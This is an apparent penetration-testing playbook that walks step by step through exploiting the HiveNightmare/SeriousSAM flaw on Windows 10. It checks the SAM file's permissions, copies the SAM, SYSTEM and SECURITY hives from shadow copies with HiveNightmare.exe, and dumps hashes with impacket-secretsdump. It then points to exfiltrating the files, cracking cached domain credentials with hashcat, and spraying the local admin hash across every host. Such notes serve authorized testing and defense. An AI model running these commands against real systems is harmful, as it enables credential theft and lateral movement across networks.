# HiveNightmare (SeriousSAM)

## Before I start
- [ ] Any low-priv shell on a 2021-era Windows 10 box (build 1809+)
- [ ] ACL check: icacls C:\Windows\System32\config\sam → BUILTIN\Users:(I)(RX) = vulnerable

## Shadow copy required
vssadmin list shadows
- [ ] Empty = dead end (can't create one without admin) → other privesc: :Pb windows-enum
- [ ] Any restore point present → go

## Dump the hives
.\HiveNightmare.exe
- [ ] Produces SAM-YYYY-MM-DD / SYSTEM- / SECURITY- files from the newest shadow
- [ ] Or SeriousSAM.exe for direct hashes
- [ ] Exfil the three files: :Pb file-transfer

## Crack open
impacket-secretsdump -sam SAM-* -system SYSTEM-* -security SECURITY-* LOCAL
- [ ] SAM: local admin NT hash → pass-the-hash sweep: :Pb lateral-movement
- [ ] SECURITY: $DCC2$ cached domain creds → hashcat -m 2100, machine DPAPI keys: :Pb dpapi

## If it fails
- [ ] icacls shows no Users read = fixed image (Win11/patched) → done here
- [ ] secretsdump bootKey errors = wrong file pairing; re-copy SYSTEM from the same shadow date

## Next
- [ ] Local admin hash → spray at every host (one account, many machines): :Pb spraying logic
- [ ] Domain creds from cache → :Pb domain-enum
